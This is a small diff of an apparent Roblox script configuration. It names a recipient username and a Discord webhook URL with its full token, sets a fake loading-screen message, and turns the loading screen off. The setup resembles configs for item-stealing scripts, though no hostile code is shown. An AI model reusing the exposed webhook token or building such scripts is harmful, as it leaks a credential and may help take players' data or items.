@@ -1,6 +1,6 @@
 Username = "HosteeScriptz"
 WebHook = "https://discord.com/api/webhooks/1114164888147861534/2pnRiDU0gcz60oWnVlycPWUce7uuaZtcuAAEu6K9dMxcY4SLyehxhGDwmJwaptI74q2e"
-loadingscreen = true
+loadingscreen = false
 _G.CustomScriptName = ".gg/rizzhub For More Info"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script..."
